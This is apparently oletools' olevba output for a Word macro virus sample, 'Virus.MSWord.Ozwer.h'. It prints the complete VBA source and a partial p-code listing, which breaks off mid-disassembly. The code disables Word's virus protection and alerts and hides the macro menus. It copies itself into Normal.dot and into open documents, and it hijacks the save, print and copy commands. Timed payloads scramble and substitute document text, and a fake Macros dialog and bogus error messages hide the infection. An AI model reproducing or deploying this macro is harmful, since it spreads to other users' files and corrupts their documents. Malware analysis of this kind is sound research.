olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ozwer.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ozwer.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO courier.bas 
in file: Virus.MSWord.Ozwer.h - OLE stream: 'Macros/VBA/courier'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Public Sub AutoExec()
On Error Resume Next
   CommandBars("Visual Basic").Visible = False
   CommandBars("Control Toolbox").Visible = False
       With CommandBars("tools")
.Controls(12).Enabled = False 'macro
.Controls(13).Enabled = False 'modelos e suplemento....
.Controls(14).Enabled = False  'personalizar...
.Controls(15).Enabled = True  'opções...
End With
CommandBars("view").Controls(6).Enabled = False 'barras de ferramentas
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
End Sub
Sub AutoOpen()
On Error Resume Next
AutoExec
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    Options.VirusProtection = False
inf
timer
End Sub
Sub AutoClose()
c
End Sub
Sub inf()
On Error Resume Next
Options.SaveNormalPrompt = False
    If Nch = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="courier", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="cor", Object:=wdOrganizerObjectProjectItems
        Application.Caption = "° Microsoft Word"
    End If
    If Dch = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="courier", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="cor", Object:=wdOrganizerObjectProjectItems
    End If
End Sub
Function Nch()
Dim i As Integer
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "courier" Then Nch = True
    Next
End Function
Function Dch()
Dim j As Integer
    For j = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(j).Name = "courier" Then Dch = True
    Next
End Function
Public Sub c()
Options.SaveNormalPrompt = False
inf
End Sub
Sub FormatFont()
inf
Dialogs(wdDialogFormatFont).Show
End Sub
Sub FilePrint()
inf
Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileSaveas()
c
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
c
ActiveDocument.Save
End Sub

Sub filenew()
Word.Documents.Add
inf
timer
End Sub
Sub EditCopy()
inf
Selection.Copy
End Sub
Sub editpaste()
inf

Selection.Paste
End Sub
Sub ToolsMacro()
On Error Resume Next
cor.Show
End Sub
Sub FileExit()
c
Application.Quit
MsgBox ("oK")
End Sub
Sub ViewVBCode()
On Error Resume Next
Dim letr As String
letr = CommandBars("tools").Controls(16).Caption
Select Case letr
Case "Opcio&nes..."
MsgBox "Error interno no Word Basic Err=1100e." + vbCr + "Impossível carregar bibliotecas dinámicas." + vbCr + vbCr + "Certifique-se que todos os arquivos estão" + vbCr + "em suas pastas." + vbCr + vbCr + "Se o problema persistir, consulte a guia" + vbCr + "do usuário.", vbCritical
Case "&Options..."
MsgBox "Word Basic internal error Err=1100e." + vbCr + "Unable to load module 1x6004." + vbCr + vbCr + "Check that all files are in their folders" + vbCr + "and that they are not damaged." + vbCr + vbCr + "If the problem persists, consult user´s guide.", vbCritical
End Select
End Sub
Sub ToolsOptions()
Dim Y As Byte
Randomize
Y = Int((7 * Rnd) + 1)
Select Case Y
    Case 1
        Dialogs(wdDialogToolsOptionsTabView).Show
    Case 2
        Dialogs(wdDialogToolsOptionsSpellingAndGrammar).Show
    Case 3
        Dialogs(wdDialogToolsOptionsTabPrint).Show
    Case 4
        Dialogs(wdDialogToolsOptionsTabEdit).Show
    Case 6
         Dialogs(wdDialogToolsOptionsTabTrackChanges).Show
    Case 5
         Dialogs(wdDialogToolsOptionsTabUserInfo).Show
    Case 7
         Dialogs(wdDialogToolsOptionsCompatibility).Show
    End Select
End Sub
Sub cor2()Rem Nem tudo é perfeito, se fosse voçê não me acharia Ass: Courier!!!!!
Dim indi, nu, nu2, limite, x As Integer
x = Int((4 * Rnd) + 1)
On Error GoTo bye
limite = ActiveDocument.Words.Count
If limite = (limite > 350 And limite < 400) Or (limite > 700 And limite < 750) Or (limite > 900 And limite < 950) Or (limite > 1000 And limite < 1050) Or (limite > 1150 And limite < 1200) Or (limite > 1300 And limite < 1350) Or (limite > 1500 And limite < 1600) And x = 3 Then
    Selection.HomeKey Unit:=wdStory
    For indi = 1 To limite
        Randomize
        nu2 = Int((5 * Rnd) + 2)
        nu = Int((4 * Rnd) + 1)
        indi = indi + nu2
            ActiveDocument.Words(indi).Select
        WordBasic.MoveText
            If nu = 1 Then
                        Selection.MoveRight Unit:=wdWord, Count:=nu2
            Else
                        Selection.MoveLeft Unit:=wdWord, Count:=nu2
            End If
        WordBasic.OK
Next indi
End If
timer
bye:
End Sub
Sub infect()
       With CommandBars("file")
.Controls(4).Enabled = False
.Controls(5).Enabled = False
.Controls(6).Enabled = False
End With
    Selection.MoveUp Unit:=wdLine, Count:=73
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "A"
        .Replacement.Text = "Courier"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = True
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute
    Selection.Find.Execute Replace:=wdReplaceAll
    With Selection.Find
        .Text = "0"
        .Replacement.Text = "10"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = True
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute
    Selection.Find.Execute Replace:=wdReplaceAll
    With Selection.Find
        .Text = "o"
        .Replacement.Text = "8"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = True
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute
    Selection.Find.Execute Replace:=wdReplaceAll
    With Selection.Find
        .Text = "e"
        .Replacement.Text = "d"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = True
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
    With Selection.Find
        .Text = "b"
        .Replacement.Text = "c"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = True
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
    Selection.Find.Execute
    With Selection.Find
        .Text = "de"
        .Replacement.Text = "COURIER"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = True
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute
    Selection.Find.Execute
End Sub
Sub timer()
Application.OnTime When:=Now + TimeValue("00:20:00"), Name:="cor2"
Application.OnTime When:=Now + TimeValue("00:35:35"), Name:="infect"
End Sub

-------------------------------------------------------------------------------
VBA MACRO cor.frm 
in file: Virus.MSWord.Ozwer.h - OLE stream: 'Macros/VBA/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




































































































Option Explicit
Private Sub CommandButton1_Click()
Beep
Beep
End Sub
Private Sub CommandButton2_Click()
On Error Resume Next
cor.Hide
End Sub
Private Sub CommandButton3_Click()
Beep
Beep
End Sub
Private Sub CommandButton4_Click()
Beep
Beep
End Sub
Private Sub CommandButton5_Click()
Beep
Beep
End Sub
Private Sub CommandButton6_Click()
Beep
Beep
End Sub
Private Sub CommandButton7_Click()
Beep
Beep
End Sub
Private Sub userform_initialize()
On Error Resume Next
Dim user, docn, PyD, Pg, Cw, Dc, Mc, Pr, letr As String
letr = CommandBars("tools").Controls(16).Caption
Select Case letr
Case "Opcio&nes..."
        PyD = "Todos os Modelos e documentos ativos"
        Pg = "Normal.dot (plantilla global)"
        Cw = "Comandos do Word"
        Dc = " (documento)"
        Mc = "Macros criadas em "
        Pr = " por "
        CommandButton1.Caption = "Executar"
        CommandButton1.ControlTipText = "Executa uma macro selecionada (não há macros disponíveis)"
        CommandButton2.Caption = "Cancelar"
        CommandButton2.ControlTipText = "Cancelar seleção"
        CommandButton3.Caption = "Passo a passo"
        CommandButton3.ControlTipText = "Executa macro instrução por instrução"
        CommandButton4.Caption = "Modificar"
        CommandButton4.ControlTipText = "Modificar macro selecionada (não há macros disponíveis)"
        CommandButton5.Caption = "Criar"
        CommandButton5.ControlTipText = "Criar uma macro nova (não disponivel)"
        CommandButton7.Caption = "Excluir"
        CommandButton7.ControlTipText = "Excluir macro selecionada (não há macros disponíveis)"
        CommandButton6.Caption = "Organizador..."
        Label3.Caption = "Nome do macro:"
        Label1.Caption = "Macros em:"
        Label2.Caption = "Descrição:"
        
        
Case "&Options..."
        PyD = "All templates and active documents"
        Pg = "Normal.dot (global template)"
        Cw = "Word commands"
        Dc = " (document)"
        Mc = "Macros made on "
        Pr = " by "
        CommandButton1.Caption = "Run"
        CommandButton1.ControlTipText = "Run selected macro (no macros available)"
        CommandButton2.Caption = "Cancel"
        CommandButton2.ControlTipText = "Cancel selection"
        CommandButton3.Caption = "Step by step"
        CommandButton3.ControlTipText = "Run macro step by step"
        CommandButton4.Caption = "Modify"
        CommandButton4.ControlTipText = "Modify selected macro seleccionada (no macros available)"
        CommandButton5.Caption = "New"
        CommandButton5.ControlTipText = "Create a new macro (not available)"
        CommandButton7.Caption = "Delete"
        CommandButton7.ControlTipText = "Delete selected macro (no macro selected)"
        CommandButton6.Caption = "Organizer..."
        Label3.Caption = "Macro name:"
        Label1.Caption = "Macros in:"
        Label2.Caption = "Description:"
End Select
docn = ActiveDocument.Name
user = Application.UserName
ComboBox1.Text = PyD
ComboBox1.AddItem (PyD), 0
ComboBox1.AddItem (Pg), 1
ComboBox1.AddItem (Cw), 2
ComboBox1.AddItem (docn & Dc), 3
ComboBox1.AddItem (""), 4
ComboBox1.AddItem (""), 5
TextBox1.Text = Mc & Date & Pr & user

End Sub
Rem Courier é 10
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ozwer.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/courier - 12610 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	FuncDefn (Public Sub AutoExec())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #4:
' 	LitVarSpecial (False)
' 	LitStr 0x000F "Control Toolbox"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #5:
' 	StartWithExpr 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #6:
' 	LitVarSpecial (False)
' 	LitDI2 0x000C 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001E 0x0005 "macro"
' Line #7:
' 	LitVarSpecial (False)
' 	LitDI2 0x000D 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001E 0x0018 "modelos e suplemento...."
' Line #8:
' 	LitVarSpecial (False)
' 	LitDI2 0x000E 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001F 0x000F "personalizar..."
' Line #9:
' 	LitVarSpecial (True)
' 	LitDI2 0x000F 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001E 0x0009 "opções..."
' Line #10:
' 	EndWith 
' Line #11:
' 	LitVarSpecial (False)
' 	LitDI2 0x0006 
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x0030 0x0015 "barras de ferramentas"
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #13:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Sub AutoOpen())
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' 	ArgsCall AutoExec 0x0000 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #20:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	ArgsCall inf 0x0000 
' Line #23:
' 	ArgsCall timer 0x0000 
' Line #24:
' 	EndSub 
' Line #25:
' 	FuncDefn (Sub AutoClose())
' Line #26:
' 	ArgsCall c 0x0000 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Sub inf())
' Line #29:
' 	OnError (Resume Next) 
' Line #30:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #31:
' 	Ld Nch 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "courier"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #33:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "cor"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #34:
' 	LitStr 0x0010 "° Microsoft Word"
' 	Ld Application 
' 	MemSt Caption 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	Ld Dch 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #37:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "courier"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #38:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "cor"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Function Nch())
' Line #42:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #44:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "courier"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Nch 
' 	EndIf 
' Line #45:
' 	StartForVariable 
' 	Next 
' Line #46:
' 	EndFunc 
' Line #47:
' 	FuncDefn (Function Dch())
' Line #48:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #49:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #50:
' 	Ld j 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "courier"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Dch 
' 	EndIf 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	EndFunc 
' Line #53:
' 	FuncDefn (Public Sub c())
' Line #54:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #55:
' 	ArgsCall inf 0x0000 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Sub FormatFont())
' Line #58:
' 	ArgsCall inf 0x0000 
' Line #59:
' 	Ld wdDialogFormatFont 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Sub FilePrint())
' Line #62:
' 	ArgsCall inf 0x0000 
' Line #63:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub FileSaveas())
' Line #66:
' 	ArgsCall c 0x0000 
' Line #67:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Sub FileSave())
' Line #70:
' 	ArgsCall c 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Sub filenew())
' Line #75:
' 	Ld Word 
' 	MemLd Documents 
' 	ArgsMemCall Add 0x0000 
' Line #76:
' 	ArgsCall inf 0x0000 
' Line #77:
' 	ArgsCall timer 0x0000 
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Sub EditCopy())
' Line #80:
' 	ArgsCall inf 0x0000 
' Line #81:
' 	Ld Selection 
' 	ArgsMemCall Copy 0x0000 
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Sub editpaste())
' Line #84:
' 	ArgsCall inf 0x0000 
' Line #85:
' Line #86:
' 	Ld Selection 
' 	ArgsMemCall Paste 0x0000 
' Line #87:
' 	EndSub 
' Line #88:
' 	FuncDefn (Sub ToolsMacro())
' Line #89:
' 	OnError (Resume Next) 
' Line #90:
' 	Ld cor 
' 	ArgsMemCall Show 0x0000 
' Line #91:
' 	EndSub 
' Line #92:
' 	FuncDefn (Sub FileExit())
' Line #93:
' 	ArgsCall c 0x0000 
' Line #94:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #95:
' 	LitStr 0x0002 "oK"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #96:
' 	EndSub 
' Line #97:
' 	FuncDefn (Sub ViewVBCode())
' Line #98:
' 	OnError (Resume Next) 
' Line #99:
' 	Dim 
' 	VarDefn letr (As String)
' Line #100:
' 	LitDI2 0x0010 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	St letr 
' Line #101:
' 	Ld letr 
' 	SelectCase 
' Line #102:
' 	LitStr 0x000C "Opcio&nes..."
' 	Case 
' 	CaseDone 
' Line #103:
' 	LitStr 0x0026 "Error interno no Word Basic Err=1100e."
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x002A "Impossível carregar bibliotecas dinámicas."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0029 "Certifique-se que todos os arquivos estão"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x000F "em suas pastas."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0028 "Se o problema persistir, consulte a guia"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x000B "do usuário."
' 	Add 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #104:
' 	LitStr 0x000B "&Options..."
' 	Case 
' 	CaseDone 
' Line #105:
' 	LitStr 0x0024 "Word Basic internal error Err=1100e."
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x001D "Unable to load module 1x6004."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0029 "Check that all files are in their folders"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x001E "and that they are not damaged."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x002E "If the problem persists, consult user´s guide."
' 	Add 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #106:
' 	EndSelect 
' Line #107:
' 	EndSub 
' Line #108:
' 	FuncDefn (Sub ToolsOptions())
' Line #109:
' 	Dim 
' 	VarDefn Y (As Byte)
' Line #110:
' 	ArgsCall Read 0x0000 
' Line #111:
' 	LitDI2 0x0007 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Y 
' Line #112:
' 	Ld Y 
' 	SelectCase 
' Line #113:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #114:
' 	Ld wdDialogToolsOptionsTabView 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #115:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #116:
' 	Ld wdDialogToolsOptionsSpellingAndGrammar 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #117:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #118:
' 	Ld wdDialogToolsOptionsTabPrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #119:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #120:
' 	Ld wdDialogToolsOptionsTabEdit 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #121:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #122:
' 	Ld wdDialogToolsOptionsTabTrackChanges 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #123:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #124:
' 	Ld wdDialogToolsOptionsTabUserInfo 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #125:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' Line #126:
' 	Ld wdDialogToolsOptionsCompatibility 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #127:
' 	EndSelect 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Sub cor2())
' 	Rem 0x0044 " Nem tudo é perfeito, se fosse voçê não me acharia Ass: Courier!!!!!"
' Line #130:
' 	Dim 
' 	VarDefn indi
' 	VarDefn nu
' 	VarDefn nu2
' 	VarDefn limite
' 	VarDefn x (As Integer)
' Line #131:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St x 
' Line #132:
' 	OnError bye 
' Line #133:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	St limite 
' Line #134:
' 	Ld limite 
' 	Ld limite 
' 	LitDI2 0x015E 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x0190 
' 	Lt 
' 	And 
' 	Paren 
' 	Eq 
' 	Ld limite 
' 	LitDI2 0x02BC 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x02EE 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x0384 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x03B6 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x03E8 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x041A 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x047E 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x04B0 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x0514 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x0546 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x05DC 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x0640 
' 	Lt 
' 	And 
' 	Paren 
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	And 
' 	Or 
' 	IfBlock 
' Line #135:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #136:
' 	StartForVariable 
' 	Ld indi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld limite 
' 	For 
' Line #137:
' 	ArgsCall Read 0x0000 
' Line #138:
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0002 
' 	Add 
' 	FnInt 
' 	St nu2 
' Line #139:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St nu 
' Line #140:
' 	Ld indi 
' 	Ld nu2 
' 	Add 
' 	St indi 
' Line #141:
' 	Ld indi 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #142:
' 	Ld WordBasic 
' 	ArgsMemCall MoveText 0x0000 
' Line #143:
' 	Ld nu 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #144:
' 	Ld wdWord 
' 	ParamNamed Unit 
' 	Ld nu2 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0002 
' Line #145:
' 	ElseBlock 
' Line #146:
' 	Ld wdWord 
' 	ParamNamed Unit 
' 	Ld nu2 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveLeft 0x0002 
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	Ld WordBasic 
' 	ArgsMemCall OK 0x0000 
' Line #149:
' 	StartForVariable 
' 	Ld indi 
' 	EndForVariable 
' 	NextVar 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	ArgsCall timer 0x0000 
' Line #152:
' 	Label bye 
' Line #153:
' 	EndSub 
' Line #154:
' 	FuncDefn (Sub infect())
' Line #155:
' 	StartWithExpr 
' 	LitStr 0x0004 "file"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #156:
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #157:
' 	LitVarSpecial (False)
' 	LitDI2 0x0005 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #158:
' 	LitVarSpecial (False)
' 	LitDI2 0x0006 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #159:
' 	EndWith 
' Line #160:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0049 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveUp 0x0002 
' Line #161:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #162:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #163:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #164:
' 	LitStr 0x0001 "A"
' 	MemStWith Then 
' Line #165:
' 	LitStr 0x0007 "Courier"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #166:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #167:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #168:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #169:
' 	LitVarSpecial (True)
' 	MemStWith MatchCase 
' Line #170:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #171:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #172:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #173:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #174:
' 	EndWith 
' Line #175:
' 	Ld Selection 
